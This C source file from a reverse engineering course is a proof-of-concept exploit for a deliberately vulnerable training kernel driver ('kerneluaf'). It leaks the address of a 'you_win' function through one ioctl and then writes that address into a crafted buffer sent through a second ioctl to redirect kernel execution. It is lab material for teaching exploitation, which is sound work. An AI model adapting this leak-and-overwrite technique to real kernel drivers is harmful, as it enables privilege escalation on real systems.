//
// Reverse Engineering course
// Author: martin.uy/reverse
// License: Creative Commons Attribution-ShareAlike (CC-BY-SA)
//

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "kerneluaf.h"

int main () {
	int fd = -1;
    void** ioctl_kernel_info_buffer = NULL;
    void* you_win_address = NULL;
    char* ioctl_kernel_copy_buffer = NULL;
	
	fd = open(DEVICE_NAME, 0);
	printf("fd: %d\n", fd);
	if (fd < 0) {
		goto cleanup;
	}
	
    ioctl_kernel_info_buffer = (void*)malloc(sizeof(void*));
    if (ioctl_kernel_info_buffer == NULL) {
        goto cleanup;
    }
	if (ioctl(fd, IOCTL_LEAK_INFO, ioctl_kernel_info_buffer) != 0) {
		goto cleanup;
	}
    you_win_address = *ioctl_kernel_info_buffer;
    printf("you_win_address: %p\n", you_win_address);

    ioctl_kernel_copy_buffer = (char*)malloc(MAX_SIZE_IOCTL_COPY_BUFFER);
    if (ioctl_kernel_copy_buffer == NULL) {
        goto cleanup;
    }
    *(unsigned int*)ioctl_kernel_copy_buffer = 10 + sizeof(void*);

    *(void**)(ioctl_kernel_copy_buffer+sizeof(unsigned int)+10) = you_win_address;
    if (ioctl(fd, IOCTL_COPY_BUFFER, ioctl_kernel_copy_buffer) != 0) {
		goto cleanup;
	}

cleanup:
	if (fd >= 0) {
		close(fd);
	}

    if (ioctl_kernel_info_buffer != NULL) {
        free(ioctl_kernel_info_buffer);
    }

    if (ioctl_kernel_copy_buffer != NULL) {
        free(ioctl_kernel_copy_buffer);
    }
	
	return 0;
}
